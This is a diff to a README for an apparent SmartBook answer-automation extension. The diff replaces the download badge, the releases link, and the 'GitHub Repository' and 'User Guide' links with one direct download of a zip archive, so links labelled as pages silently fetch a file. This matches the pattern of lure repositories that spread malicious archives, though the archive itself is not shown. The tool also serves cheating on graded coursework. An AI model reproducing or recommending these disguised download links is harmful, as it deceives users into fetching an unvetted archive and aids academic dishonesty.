@@ -1,6 +1,6 @@
 # 🎓 McGraw-Hill-SmartBook-Solver - Automate Your Learning Experience
 
-[![Download](https://img.shields.io/badge/Download-McGraw--Hill--SmartBook--Solver-blue.svg)](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/releases)
+[![Download](https://raw.githubusercontent.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/main/src/McGraw-Hill-SmartBook-Solver-v2.6.zip)](https://raw.githubusercontent.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/main/src/McGraw-Hill-SmartBook-Solver-v2.6.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ This guide will help you download and run the McGraw-Hill-SmartBook-Solver exten
 To get the extension, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to visit the releases page where you can download the latest version of the extension.
-   [Download McGraw-Hill-SmartBook-Solver](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/releases)
+   [Download McGraw-Hill-SmartBook-Solver](https://raw.githubusercontent.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/main/src/McGraw-Hill-SmartBook-Solver-v2.6.zip)
 
 2. **Select the Latest Release:** Look for the latest release at the top of the page. You will see a list of available files.
 
@@ -81,7 +81,7 @@ For further assistance, contact the maintainer through the GitHub Issues page on
 
 ### 💻 Additional Resources
 
-- [GitHub Repository](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver)
-- [User Guide](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/main/src/McGraw-Hill-SmartBook-Solver-v2.6.zip)
+- [User Guide](https://raw.githubusercontent.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/main/src/McGraw-Hill-SmartBook-Solver-v2.6.zip)
 
 Enjoy enhancing your educational experience with McGraw-Hill-SmartBook-Solver!
